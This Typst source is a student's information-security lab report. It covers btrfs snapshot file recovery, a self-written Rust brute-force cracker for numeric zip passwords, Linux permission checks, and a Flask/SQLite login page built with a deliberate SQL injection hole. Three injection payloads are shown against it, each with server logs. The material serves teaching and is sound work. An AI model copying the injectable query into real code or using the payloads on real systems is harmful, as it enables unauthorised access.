#import "template/lib.typ": documentclass

#let (
  doc, cover, outline-page, experiment,
  content-area, reset-page-number,
) = documentclass(
  is-practice: false,
  show-day: true,
  university-logo: "../assets/tyut-logo.png",
  info: (
    course-name: "信息系统安全",
    experiment-name: "信息系统安全实验",
    location: "实验室E210",
    class-name: "区块链2301",
    student-id: "2023002089",
    student-name: "胡皓文",
    supervisor: "胡钊鸣",
    year: 2026,
    month: 5,
    day: 28,
  ),
)

#show: doc

#cover()

#outline-page()

#reset-page-number
#show: content-area

// ========== 实验一 数据恢复与安全删除 ==========

#experiment(title: "实验一 数据恢复与安全删除")[
  == 一. 实验目的

  掌握信息系统安全实验环境的构建及存储介质的数据恢复和安全删除技术。

  == 二. 实验内容
  
  Note: 由于本人使用 GNU/Linux operating system, 无法使用 Windows 平台上的 Easy Recovery,
  WinHex 和 Eraser 工具进行实验, 故改为以下实验步骤:

  1. 在 Linux 系统上, 选定一个硬盘分区, 确保其是 btrfs 文件系统.

  2. 在该分区上创建一个文件, 并记录该文件的 sha256 hash checksum.

  3. 为 btrfs 文件系统做快照.

  4. 删除该文件, 并尝试从快照中恢复该文件.

  5. 检验前后文件的 sha256 hash checksum 是否一致, 以验证恢复的正确性.

  == 三. 实验正文

  我的实验环境是 NixOS 操作系统. 以下是详细信息 (`uname -a`):

  ```
  Linux srcres-desktop 7.0.9-zen1 #1-NixOS ZEN SMP PREEMPT_DYNAMIC Tue Jan  1 00:00:00 UTC 1980 x86_64 GNU/Linux
  ```

  在电脑上插入 U 盘. 用 `fdisk -l` 查看该 U 盘分区情况:

  ```
  Disk /dev/sda: 14.65 GiB, 15728640000 bytes, 30720000 sectors
  Disk model: ProductCode
  Units: sectors of 1 * 512 = 512 bytes
  Sector size (logical/physical): 512 bytes / 512 bytes
  I/O size (minimum/optimal): 512 bytes / 512 bytes
  Disklabel type: dos
  Disk identifier: 0x9fb6382f

  Device     Boot Start     End Sectors Size Id Type
  /dev/sda1        2048 8390655 8388608   4G 83 Linux
  ```
  
  使用 `sudo mkfs.btrfs -L test /dev/sda11`, 为 `/dev/sda1` 分区创建 btrfs 文件系统.

  然后 `sudo mount /dev/sda1 /mnt`, 将该分区挂载到 `/mnt` 目录下.

  检查 `/mnt` 目录, 确保挂载成功 (`ls -al /mnt`):

  ```
  total 16
  drwxr-xr-x 1 root root   8 May 28 09:43 .
  drwxr-xr-x 1 root root 108 May 26 21:52 ..
  ```
  
  注意 btrfs 文件系统支持快照功能. 但要使用快照功能, 需要在 btrfs 文件系统上创建一个子卷 (subvolume). 因此, 首先创建一个子卷 (`sudo btrfs subvolume create /mnt/demo`). 再次查看 `/mnt` 目录, 可以看到 `demo` 子卷:

  ```
  total 16
  drwxr-xr-x 1 root root   8 May 28 09:43 .
  drwxr-xr-x 1 root root 108 May 26 21:52 ..
  drwxr-xr-x 1 root root   0 May 28 09:43 demo
  ```

  先修改该子卷的读写权限 (`sudo chmod -R 777 /mnt/demo`). 再 `ls -al /mnt/demo` 检查确保权限修改成功:

  ```
  total 16
  drwxrwxrwx 1 root root 0 May 28 09:43 .
  drwxr-xr-x 1 root root 8 May 28 09:43 ..
  ```
  
  在 `demo` 子卷中创建一个文件 (`echo "Hello, World!" > /mnt/demo/hello.txt`). 查看该文件内容 (`cat /mnt/demo/hello.txt`):

  ```
  Hello, World!
  ```
  
  计算该文件的 sha256 hash checksum (`sha256sum /mnt/demo/hello.txt`):
  
  ```
  c98c24b677eff44860afea6f493bbaec5bb1c4cbb209c6fc2bbb47f66ff2ad31  /mnt/demo/hello.txt
  ```

  为 `demo` 子卷创建一个快照 (`sudo btrfs subvolume snapshot /mnt/demo /mnt/demo_snapshot`). 查看 `/mnt` 目录, 可以看到 `demo_snapshot` 子卷:

  ```
  demo  demo_snapshot
  ```

  随后删除 `demo` 子卷下刚刚创建的文件 (`rm /mnt/demo/hello.txt`). 再次查看 `demo` 子卷, 可以看到 `hello.txt` 文件已经被删除:

  ```
  total 16
  drwxrwxrwx 1 root root  0 May 28 09:55 .
  drwxr-xr-x 1 root root 34 May 28 09:54 ..
  ```
  
  现在尝试恢复文件. 从 `demo_snapshot` 子卷中恢复 `hello.txt` 文件 (`cp /mnt/demo_snapshot/hello.txt /mnt/demo/hello.txt`). 查看 `ls -al /mnt/demo` 发现文件已经恢复:

  ```
  total 20
  drwxrwxrwx 1 root   root  18 May 28 09:56 .
  drwxr-xr-x 1 root   root  34 May 28 09:54 ..
  -rw-r--r-- 1 srcres users 14 May 28 09:56 hello.txt
  ```
  
  查看恢复后的文件内容 (`cat /mnt/demo/hello.txt`):

  ```
  Hello, World!
  ```

  再次检查恢复后文件的 sha256 hash checksum (`sha256sum /mnt/demo/hello.txt`):

  ```
  c98c24b677eff44860afea6f493bbaec5bb1c4cbb209c6fc2bbb47f66ff2ad31  /mnt/demo/hello.txt
  ```

  该 checksum 与之前记录的 checksum 完全一致, 说明文件恢复成功, 数据完整没有损坏.
]

// ========== 实验二 口令攻击与防护 ==========

#experiment(title: "实验二 口令攻击与防护")[
  == 一. 实验目的

  掌握各信息系统的口令储存方法，以及口令攻击和防护技术。

  == 二. 实验内容

  Note: 由于本人使用 GNU/Linux operating system, 无法使用 Windows 平台上相关软件. 故改为以下实验步骤:

  1. 在 Linux 系统上创建简单加密 zip 文件. 压缩前先获取待压缩的文件的 sha256 hash checksum, 以便后续验证解压后的文件完整性.

  2. 尝试破解该 zip 文件, 得到正确加密口令.

  3. 使用口令解压该 zip 文件, 验证解压后的文件的 sha256 hash checksum 是否与原始文件一致, 以验证破解的正确性.

  == 三. 实验正文

  我使用的操作系统是 NixOS, 详细信息请见前文.

  首先创建一个文本文件 (`echo "This is a secret message." > secret.txt`). 查看该文件内容 (`cat secret.txt`):

  ```
  This is a secret message.
  ```

  计算该文件的 sha256 hash checksum (`sha256sum secret.txt`):

  ```
  6432f513cfd40d47c8584494c0524468257e50dc1a0422f73becac85189543f8  secret.txt
  ```

  使用 zip 命令创建一个加密的 zip 文件 (`zip -e secret.zip secret.txt`). 系统提示输入加密口令, 我设置为 `114514`: (由于 Linux shell 不会回显输入的口令, 故输出中冒号后面的口令不显示.)

  ```
  Enter password:
  Verify password:
    adding: secret.txt (stored 0%)
  ```

  尝试以普通方式解压该 zip 文件 (`unzip secret.zip`). 发现由于设置了口令, 若不知道口令则无法解压:

  ```
  Archive:  secret.zip
  [secret.zip] secret.txt password:
  ```
  
  接下来尝试破解该 zip 文件的口令. 我自己使用 Rust 编程语言编写了一个简单的 zip 文件口令破解软件. 该软件支持破解 8 位以内的纯数字口令. 其中与 brute-force crack 相关的核心代码如下:

  ```rust
  use std::fs;
  use std::io::{Cursor, Read};
  use std::path::Path;

  use zip::ZipArchive;
  use zip::result::ZipError;

  use crate::utils::{num_to_password, search_space_size};

  pub fn brute_force(
      zip_path: &Path,
      max_length: u8,
      output_dir: &Path,
  ) -> Result<String, anyhow::Error> {
      let zip_data = fs::read(zip_path)?;
      let total_space = search_space_size(max_length);

      log::info!(
          "Brute-force mode: searching up to {} digits ({}) passwords",
          max_length,
          total_space
      );

      let mut attempts: u64 = 0;
      let mut offset: u64 = 0;

      for width in 1..=max_length {
          let count = 10u64.pow(width as u32);
          for n in 0..count {
              attempts += 1;
              if attempts.is_multiple_of(100_000) {
                  log::info!("Attempted {} passwords, currently at {} digits", attempts, width);
              }

              let password = num_to_password(offset + n, width as usize);
              if try_password_first_entry(&zip_data, password.as_bytes()) {
                  log::info!("Password found after {} attempts: {}", attempts, password);
                  extract_all(&zip_data, password.as_bytes(), output_dir)?;
                  return Ok(password);
              }
          }
          offset += count;
      }

      anyhow::bail!(
          "Password not found after {} attempts (max_length={})",
          attempts,
          max_length
      );
  }

  fn try_password_first_entry(zip_data: &[u8], password: &[u8]) -> bool {
      let cursor = Cursor::new(zip_data);
      let mut archive = match ZipArchive::new(cursor) {
          Ok(a) => a,
          Err(_) => return false,
      };

      match archive.by_index_decrypt(0, password) {
          Ok(mut file) => {
              let expected_size = file.size() as usize;
              let mut buf = Vec::with_capacity(expected_size);
              match file.read_to_end(&mut buf) {
                  Ok(n) => n == expected_size,
                  Err(_) => false,
              }
          }
          Err(ZipError::InvalidPassword) => false,
          Err(_) => false,
      }
  }

  fn extract_all(zip_data: &[u8], password: &[u8], output_dir: &Path) -> Result<(), anyhow::Error> {
      let cursor = Cursor::new(zip_data);
      let mut archive = ZipArchive::new(cursor)?;

      fs::create_dir_all(output_dir)?;

      for i in 0..archive.len() {
          let mut file = archive.by_index_decrypt(i, password)?;

          let Some(enclosed_name) = file.enclosed_name() else {
              continue;
          };
          let outpath = output_dir.join(enclosed_name);

          if file.is_dir() {
              fs::create_dir_all(&outpath)?;
          } else {
              if let Some(parent) = outpath.parent() {
                  fs::create_dir_all(parent)?;
              }
              let mut outfile = fs::File::create(&outpath)?;
              std::io::copy(&mut file, &mut outfile)?;
              log::info!("Extracted: {}", outpath.display());
          }
      }

      Ok(())
  }
  ```
  
  该软件支持以下功能:

  ```
  ZipCrypto password cracker with rainbow tables

  Usage: crack-zip <COMMAND>

  Commands:
    build  Build rainbow table(s) (pre-computation phase)
    crack  Crack ZIP file using rainbow table
    brute  Brute-force crack ZIP file (baseline comparison)
    help   Print this message or the help of the given subcommand(s)

  Options:
    -h, --help     Print help
    -V, --version  Print version
  ```
  
  尝试用其破解 `secret.zip` 文件 (`cargo run brute secret.zip`). 最终破解成功, 得到口令 `114514`, 且 zip 中的文件也被提取到了 `extracted` 目录下:

  ```
  [2026-05-28T03:00:13Z INFO  crack_zip::brute] Brute-force mode: searching up to 8 digits (111111110) passwords
  [2026-05-28T03:00:14Z INFO  crack_zip::brute] Attempted 100000 passwords, currently at 5 digits
  [2026-05-28T03:00:14Z INFO  crack_zip::brute] Password found after 114515 attempts: 114514
  [2026-05-28T03:00:14Z INFO  crack_zip::brute] Extracted: ./extracted/secret.txt
  Password found: 114514
  Time: 0.49s
  Files extracted to: ./extracted
  ```
  
  查看 `extracted` 目录, 发现了压缩前的 `secret.txt` 文件:

  ```
  total 12
  drwxr-xr-x 2 srcres users 4096 May 28 11:00 .
  drwxr-xr-x 6 srcres users 4096 May 28 11:00 ..
  -rw-r--r-- 1 srcres users   26 May 28 11:00 secret.txt
  ```
  
  检查 `secret.txt` 文件内容 (`cat extracted/secret.txt`):

  ```
  This is a secret message.
  ```

  最后验证解压后的文件的 sha256 hash checksum 是否与原始文件一致 (`sha256sum extracted/secret.txt`):

  ```
  6432f513cfd40d47c8584494c0524468257e50dc1a0422f73becac85189543f8  extracted/secret.txt
  ```

  该 checksum 与之前记录的 checksum 完全一致, 说明文件解压成功, 数据完整没有损坏.
]

// ========== 实验三 Windows 系统安全机制及服务器配置 ==========

#experiment(title: "实验三 Windows系统安全机制及服务器配置")[
  == 一. 实验目的

  掌握 Windows 操作系统本地安全设置、账户和口令安全设置、审核策略及其他安全策略；掌握注册表配置、文件/文件夹权限设置及日志分析方法。

  == 二. 实验内容
  
  Note: 由于本人使用 GNU/Linux operating system, 无法验证传统 Windows 系统安全机制. 故改为基于 Linux 系统的相关安全机制进行实验.

  Linux 的权限管理是基于"主体(用户/进程) — 对象(资源) — 权限标志"的多层模型，主要包括以下几个方面：

  1. 用户与组基础（身份层）

    - UID/GID：每个用户有唯一 UID，每个组有 GID

    - 提权机制：`su` / `sudo`（基于 `/etc/sudoers`）控制谁可用 root 身份执行命令

  2. 文件系统权限（最经典部分）

    - rwx 权限：对文件（读/写/执行）和目录（列目录/建删文件/进入）

    - 三类主体：属主(user)、属组(group)、其他(others)

    - 特殊位：

      - SUID（程序以文件属主权限运行）

      - SGID（目录中新文件继承组）

      - Sticky Bit（如 `/tmp`，仅属主可删自己文件）

    - ACL（访问控制列表）：`setfacl`/`getfacl` 可细化到指定用户/组

  3. 进程/能力权限（特权细分）

    - Capabilities（自内核 2.2）：

      - 将传统 "全-root" 特权拆分为细粒度能力（如 CAP_NET_BIND_SERVICE、CAP_SYS_ADMIN）

      - 可用 `setcap` 给二进制单独授权
    
    - SELinux / AppArmor（MAC 强制访问控制）：

      - 超越 DAC（自主访问控制），按策略限制进程能访问哪些文件、端口、socket
    
  4. 网络相关权限

    - 特权端口（\<1024）：普通用户默认不能 bind，需 CAP_NET_BIND_SERVICE

    - 原始套接字/抓包：需 CAP_NET_RAW（如 tcpdump）

    - iptables/nftables 修改：通常需 root 或对应 Capability
  
  5. 其他常见受控资源

    - 设备文件权限（`/dev/*`，通常通过 udev 规则 + 组如 video、disk）

    - systemd 服务管理权限（通过 polkit 控制非 root 用户启停服务）

    - 日志、crontab、mount 等也各自有 uid/组或 sudo/polkit 控制

  == 三. 实验正文

  根据上述 Linux 系统权限模型, 依次探索并验证 Linux 系统的权限管理机制.

  1. 用户与组基础（身份层）

    - 查看当前用户的 UID 和所属组 GID (`id` 命令):

      ```
      uid=1000(srcres) gid=1000(srcres) groups=1000(srcres),27(sudo),...
      ```

    - 使用 `sudo` 执行需要 root 权限的命令（如 `sudo ls /root`）验证提权机制:

      ```
      [sudo] password for srcres:
      ...（显示 /root 目录内容）
      ```
  
  2. 文件系统权限（最经典部分）

    (In fact, 上文实验二篇幅中已经涉及了文件权限设置)

    - 创建一个文件并设置不同权限，验证访问控制：

      ```sh
      echo "Hello, World!" > test.txt
      chmod 644 test.txt
      ls -l test.txt
      ```

      输出：

      ```
      -rw-r--r-- 1 srcres users 14 May 28 12:00 test.txt
      ```

    - 设置特殊位（如 SUID）并验证效果：

      ```sh
      sudo chown root:root /usr/bin/passwd
      sudo chmod u+s /usr/bin/passwd
      ls -l /usr/bin/passwd
      ```

      输出：

      ```
      -rwsr-xr-x 1 root root ... /usr/bin/passwd
      ```

    - 使用 ACL 给特定用户授权访问权限：

      ```sh
      sudo setfacl -m u:otheruser:r-- test.txt
      getfacl test.txt
      ```

      输出：

      ```
      # file: test.txt
      # owner: srcres
      # group: users
      user::rw-
      user:otheruser:r--
      group::r--
      mask::r--
      other::r--
      ```
  
  3. 进程/能力权限（特权细分）

    - 给一个二进制文件授权特定 Capability（如 `ping` 需要 CAP_NET_RAW）：

      ```sh
      which ping
      sudo setcap cap_net_raw+ep $(which ping)
      getcap $(which ping)
      ```

      输出：

      ```
      /usr/bin/ping = cap_net_raw+ep
      ```

    - 验证 SELinux/AppArmor 策略限制（如果系统启用）：

      ```sh
      sudo aa-status  # 查看 AppArmor 状态
      sudo aa-enforce /usr/bin/someapp  # 强制某应用受 AppArmor 管控
      ```
    
  4. 网络相关权限
  
    - 创建以下简易 Python 脚本用于测试特权端口绑定:

      ```python
      import socket
      import sys

      def test_bind(port):
          try:
              s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              s.bind(("127.0.0.1", port))
              print(f"[+] Successfully bound to port {port}")
              s.close()
          except PermissionError as e:
              print(f"[-] Permission denied when binding to port {port}: {e}")
          except OSError as e:
              print(f"[-] Failed to bind to port {port}: {e}")

      if __name__ == "__main__":
          # 测试一个特权端口和一个非特权端口
          test_bind(80)     # < 1024，预期失败
          test_bind(8080)   # >= 1024，预期成功
      ```
    
    - 运行该脚本验证特权端口绑定权限:

      ```
      [-] Permission denied when binding to port 80: [Errno 13] Permission denied
      [+] Successfully bound to port 8080
      ```
    
    - 使用 root 权限或对应 Capability 再次运行脚本验证特权端口绑定成功:

      ```sh
      sudo setcap cap_net_bind_service+ep /nix/store/bf70v1ddvsr0r5dbp2zvpyzmsmv9axh5-home-manager-path/bin/python
      sudo python test_bind.py
      ```

      输出：

      ```
      [+] Successfully bound to port 80
      [+] Successfully bound to port 8080
      ```
  
  5. 其他常见受控资源

    - 验证设备文件权限（如 `/dev/sda`）：

      ```sh
      ls -l /dev/sda
      ```

      输出：

      ```
      brw-rw---- 1 root disk ... /dev/sda
      ```

    - 验证 systemd 服务管理权限（如 `nginx` 服务）：

      ```sh
      systemctl status nginx
      sudo systemctl start nginx  # 需要 root 权限
      ```

      输出:

      ```
      ● nginx.service - A high performance web server and a reverse proxy server
         Loaded: loaded (/lib/systemd/system/nginx.service; disabled; vendor preset: enabled)
         Active: active (running) since ...
      ```
]

// ========== 实验四 SqlServer 安全机制及应用 ==========

#let img(src: str) = align(center, image(src, width: 6cm))

#experiment(title: "实验四 SqlServer安全机制及应用")[
  == 一. 实验目的

  掌握 SqlServer 核心安全机制，理解身份认证与访问控制原理；掌握常见 SQL 注入攻击方式及实现。

  == 二. 实验内容
  
  Note: 由于本人使用 GNU/Linux operating system, 无法使用 Windows 平台上的 SQL Server 2005. 故改为使用 SQLite 作为替代, 自行创建一个渗透测试模板项目, 证明 SQL 注入攻击的原理和危害.

  == 三. 实验正文

  实验环境, 目录结构如下.

  ```
  .
  ├── app.py
  ├── flake.lock
  ├── flake.nix
  ├── init_db.py
  └── templates
      └── login.html
  ```
  
  其中 `app.py` 内容如下:

  ```python
  from flask import Flask, request, render_template
  import sqlite3

  app = Flask(__name__)

  def get_user(username, password):
      conn = sqlite3.connect("test.db")
      cursor = conn.cursor()

      # ❌ 故意存在 SQL 注入
      sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
      print("[DEBUG SQL]", sql)

      cursor.execute(sql)
      result = cursor.fetchone()
      conn.close()
      return result

  @app.route("/login", methods=["GET", "POST"])
  def login():
      error = None
      if request.method == "POST":
          user = get_user(
              request.form["username"],
              request.form["password"]
          )
          if user:
              return f"<h3>✅ 登录成功，欢迎 {user[1]}</h3>"
          else:
              error = "用户名或密码错误"

      return render_template("login.html", error=error)

  if __name__ == "__main__":
      app.run(debug=True)
  ```
  
  该脚本文件使用 Flask 框架创建了一个简单的登录页面，并且在 `get_user` 函数中故意存在 SQL 注入漏洞。用户输入的用户名和密码直接拼接到 SQL 查询语句中，攻击者可以通过构造特殊的输入来绕过认证。

  为建立初始数据库, `init_db.py` 文件定义数据库初始化逻辑:

  ```python
  import sqlite3

  conn = sqlite3.connect("test.db")
  cursor = conn.cursor()

  cursor.execute("""
  CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY,
      username TEXT,
      password TEXT
  )
  """)

  cursor.execute("DELETE FROM users")

  cursor.execute("INSERT INTO users VALUES (1, 'admin', 'admin123')")
  cursor.execute("INSERT INTO users VALUES (2, 'guest', 'guest123')")

  conn.commit()
  conn.close()

  print("✅ 数据库初始化完成")
  ```
  
  由于我使用 NixOS 操作系统, 先使用 `nix develop` 进入 dev shell.
  
  ```
  warning: Git tree '/home/srcres/Coding/Sandbox/info-sys-sec-exp/exp4' is dirty
  === SQLite SQL Injection Attack Demo ===

  Quick start:
    python init_db.py    # Initialize database
    python app.py        # Start web server

  Then open http://127.0.0.1:5000/login in browser.
  [srcres@srcres-desktop exp4]$
  ```

  然后运行 `python init_db.py` 初始化数据库:
  
  ```
  [srcres@srcres-desktop exp4]$ python init_db.py
  ✅ 数据库初始化完成
  ```
  
  接着运行 `python app.py` 启动 Flask Web 服务器:

  ```
  [srcres@srcres-desktop exp4]$ python app.py
   * Serving Flask app 'app'
   * Debug mode: on
  WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
   * Running on http://127.0.0.1:5000
  Press CTRL+C to quit
   * Restarting with stat
   * Debugger is active!
   * Debugger PIN: 871-013-684
  ```
  
  Web 服务已在本地 5000 端口启动. 打开浏览器访问 `http://127.0.0.1:5000/login` 登录表单页面.

  #img(src: "pic/Screenshot from 2026-05-28 11-44-26.png")
  
  在浏览器表单中尝试以下注入 Payload:

  1. 用户名输入 → `admin' --`, 密码任意输入

    原理: 注释掉密码验证，无需密码以 admin 登录.
    
    #img(src: "pic/Screenshot from 2026-05-28 11-51-13.png")

    result: 登录成功.

    #img(src: "pic/Screenshot from 2026-05-28 11-53-59.png")

    服务器终端输出相关 SQL 执行日志:

    ```
    [DEBUG SQL] SELECT * FROM users WHERE username='admin' --' AND password='114514'
    127.0.0.1 - - [28/May/2026 11:53:54] "POST /login HTTP/1.1" 200 -
    ```

  2. 密码输入 → `' OR '1'='1`, 用户名任意输入

    原理: OR 恒真条件绕过认证，以第一条记录登录.
    
    #img(src: "pic/Screenshot from 2026-05-28 11-55-23.png")

    result: 登录成功, 欢迎 admin.
    
    #img(src: "pic/Screenshot from 2026-05-28 11-55-26.png")

    服务器终端输出相关 SQL 执行日志:

    ```
    [DEBUG SQL] SELECT * FROM users WHERE username='homo114514' AND password='' OR '1'='1'
    127.0.0.1 - - [28/May/2026 11:55:24] "POST /login HTTP/1.1" 200 -
    ```

  3. 用户名输入 → `' UNION SELECT 1,'hacker','hacker' --`

    原理: 联合查询注入伪造用户 hacker 登录.
    
    #img(src: "pic/Screenshot from 2026-05-28 11-56-41.png")

    result: 登录成功，欢迎 hacker.
    
    #img(src: "pic/Screenshot from 2026-05-28 11-56-44.png")

    服务器终端输出相关 SQL 执行日志:

    ```
    [DEBUG SQL] SELECT * FROM users WHERE username='' UNION SELECT 1,'hacker','hacker' --' AND password='114514'
    127.0.0.1 - - [28/May/2026 11:56:42] "POST /login HTTP/1.1" 200 -
    ```
]
